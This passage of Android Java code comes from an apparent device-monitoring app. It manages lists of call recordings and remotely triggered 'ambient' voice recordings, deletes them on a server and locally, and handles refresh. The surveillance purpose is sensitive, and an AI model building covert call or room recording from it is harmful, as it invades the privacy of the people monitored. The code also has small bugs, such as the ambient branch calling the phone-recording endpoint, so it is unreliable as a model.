                mAdapter.notifyDataSetChanged();

            }
            else {
                selectAll = false;
                selectionList.clear();
                updateCounter();
                mAdapter.notifyDataSetChanged();
            }

        }
        else if(item.getItemId() ==  R.id.item_Play_Ambient_Recording)
        {
            if (APIURL.isConnected(this))
            {
                ambient_Voice_Recording();
            } else {
                Toast.makeText(this, R.string.TurnOn, Toast.LENGTH_SHORT).show();
            }
        }
        else if (item.getItemId() == android.R.id.home)
        {
            if(isInActionMode)
            {
                clearActionMode();
                mAdapter.notifyDataSetChanged();
            }
            else {
                super.onBackPressed();
            }
        } else if (item.getItemId() == R.id.item_edit) {

            toolbar.getMenu().clear();
            toolbar.inflateMenu(R.menu.menu_action_mode);
            isInActionMode = true;
            mAdapter.notifyDataSetChanged();
            if (getSupportActionBar() != null) {
                getSupportActionBar().setDisplayHomeAsUpEnabled(true);
            }
        }

        return true;
    }

    @SuppressLint("StaticFieldLeak")
    private class clear_PhoneCallRecordAsyncTask extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... strings) {

            Log.d("PhoneCallRecordHistory", table.getDevice_Identifier() + "");
            StringBuilder listID = new StringBuilder();
            for (int i = 0; i < selectionList.size(); i++) {
                if (i != selectionList.size() - 1) {

                    if(functionName.equals("GetPhoneRecording"))
                        listID.append(selectionList.get(i).getID()).append(",");
                    else
                        listID.append(selectionList.get(i).getAudioName()).append(",");
                } else {


                    if(functionName.equals("GetPhoneRecording"))
                        listID.append(selectionList.get(i).getID());
                    else
                        listID.append(selectionList.get(i).getAudioName());
                }
            }

            String value;
            String function;
            if(functionName.equals("GetPhoneRecording"))
            {
               /* value = "<RequestParams Device_ID=\"" + table.getDevice_Identifier() + "\" List_ID=\"" + listID + "\" />";
                function = POST_CLEAR_MULTI_PHONE_RECORDING;//ClearMultiAmbient da70c0862faf50cf.mp4*/
                return PostJsonClearDataToServer(table.getDevice_Identifier(), listID, POST_CLEAR_MULTI_PHONE_RECORDING);
            }
            else {
//                value = "<RequestParams List_File=\"" + listID + "\" />";
//                function = POST_CLEAR_MULTI_AMBIENT;//ClearMultiAmbient da70c0862faf50cf.mp4
                return PostJsonClearDataToServer( listID, POST_CLEAR_MULTI_PHONE_RECORDING);
            }

        }

        @Override
        protected void onPostExecute(String s) {

            deviceObject(s);
            if (bodyLogin.getIsSuccess().equals("1") && bodyLogin.getIsSuccess().equals("1")) {
                ((AdapterPhoneCallRecordHistory) mAdapter).removeData(selectionList);
                clearDataSQLite(selectionList);
                clearFileAudio(selectionList);
                clearActionMode();
            } else {
                clearActionMode();
            }
            APIMethod.progressDialog.dismiss();
        }
    }

    public void clearDataSQLite(ArrayList<AudioGroup> selectionList) {
        for (AudioGroup phoneCallRecord : selectionList) {

            if(functionName.equals("GetPhoneRecording"))
            {
                databasePhoneCallRecord.delete_PhoneCallRecord_History(phoneCallRecord);
            }
            else {
                databaseAmbientRecord.delete_PhoneCallRecord_History(phoneCallRecord);
            }

        }
    }

    public void clearFileAudio(ArrayList<AudioGroup> selectionList) {
        for (AudioGroup phoneCallRecord : selectionList) {

            for (int i = 0; i < selectionList.size(); i++) {
                deleteFileAudioWithName(getApplicationContext(), phoneCallRecord.getAudioName());
            }
        }
    }

    /**
     * deleteFileAudioWithName This is a method that supports deleting audio files stored in the device's memory SD card
     */
    public static void deleteFileAudioWithName(Context context, String fileName)
    {

        File file = new File(File_PATH_SAVE_PHONE_CALL_RECORD + "/" + fileName);
        file.delete();
        context.sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, Uri.fromFile(file)));
        Log.d("fileNames", file + " == ");
    }


    public void clearActionMode() {

        if(isInActionMode)
        {
            toolbar.getMenu().clear();
            toolbar.inflateMenu(R.menu.menu_main);
            if (getSupportActionBar() != null) {
                getSupportActionBar().setDisplayHomeAsUpEnabled(true);
                getSupportActionBar().setHomeAsUpIndicator(null);
            }
            toolbar.setTitle(MyApplication.getResourcses().getString(R.string.PHONE_CALL_RECORDING));
            selectionList.clear();
            isInActionMode = false;
            mAdapter.notifyDataSetChanged();
        }
    }

    @Override
    public void onBackPressed() {
        if (isInActionMode) {
            isInActionMode = false;
            clearActionMode();
        } else {

            super.onBackPressed();
        }
    }

    @Override
    protected void onDestroy() {

        super.onDestroy();
        if (APIMethod.progressDialog != null && APIMethod.progressDialog.isShowing())
        {
            APIMethod.progressDialog.dismiss();
        }
    }

    public void reload() {

        mData.clear();
        mData = getAllPhoneCall();
        mAdapter = new AdapterPhoneCallRecordHistory(PhoneCallRecordHistory.this, mData);
        mRecyclerView.setAdapter(mAdapter);
        mAdapter.notifyDataSetChanged();
    }

    private List<AudioGroup> getAllPhoneCall()
    {
        List<AudioGroup> mdatabase;
        if(functionName.equals("GetPhoneRecording"))
        {
            mdatabase = databasePhoneCallRecord.getAll_PhoneCallRecord_ID_History(table.getID(),0);
        }
        else
        {
            mdatabase = databaseAmbientRecord.getAll_PhoneCallRecord_ID_History(table.getDevice_Identifier(),0);
        }
        return mdatabase;
    }

    /**
     * swipeRefreshLayout is a method that reloads the page and updates it further if new data has been added to the server.
     */
    public void swipeRefreshLayout() {
        swp_PhoneCallRecord.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                Calendar calendar = Calendar.getInstance();
                endLoading = false;
                checkLoadMore = false;
                currentSize = 0;
                if (isConnected(getApplicationContext()))
                {
                    checkRefresh = true;
                    if ((calendar.getTimeInMillis() - time_Refresh_Device) > LIMIT_REFRESH) {
                        //phoneCallRecordList.clear();
                        if (!phoneCallRecordList.isEmpty())
                        {
                            phoneCallRecordList.clear(); //The list for update recycle view
                            mAdapter.notifyDataSetChanged();
                        }
                        clearActionMode();
                        new getPhoneCallRecordAsyncTask(0).execute();
                        new Handler().postDelayed(new Runnable() {
                            @Override
                            public void run() {

                                swp_PhoneCallRecord.setRefreshing(false);
                                Calendar calendar1 = Calendar.getInstance();
                                time_Refresh_Device = calendar1.getTimeInMillis();

                            }
                        }, 1000);
                    } else {
                        swp_PhoneCallRecord.setRefreshing(false);
                    }
                } else {
                    swp_PhoneCallRecord.setRefreshing(false);
                    noInternet(PhoneCallRecordHistory.this);
                }
            }
        });
    }
}



